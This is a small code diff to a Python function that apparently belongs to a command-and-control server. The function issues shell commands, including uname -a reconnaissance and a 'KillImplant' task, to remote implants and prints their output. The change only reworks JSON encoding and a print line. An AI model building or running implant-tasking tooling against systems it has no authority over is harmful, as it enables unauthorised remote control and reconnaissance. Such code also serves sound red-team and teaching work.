@@ -5,8 +5,9 @@ def BuildTask(data):
     raw_reply = data.decode()
     reply = json.loads(raw_reply)
     if (reply["Type"] == "init"):
-        task = '{"id": 1, "task": "cat /sys/class/net/*/address | head -n 1"}'
-        replyMsg = str.encode(task)
+        task = {"id": 1, "task": "uname -a"}
+        taskjson = json.dumps(task)
+        replyMsg = str.encode(taskjson)
         print(reply)
     else:
         if ("data" in reply):
@@ -23,7 +24,7 @@ def BuildTask(data):
             json_to_load = {"id": uuid, "Type": Type, "task": "KillImplant"}
         else:
             json_to_load = {"id": uuid, "Type": Type, "task": cmd}
-            print("Tasking Implant " + str(uuid) + " to run: " + cmd + "\n\nOutput:\n")
+            print("\nTasking Implant " + str(uuid) + " to run: " + cmd + "\n\nOutput:")
         json_final = json.dumps(json_to_load)
         replyMsg = str.encode(json_final)
 
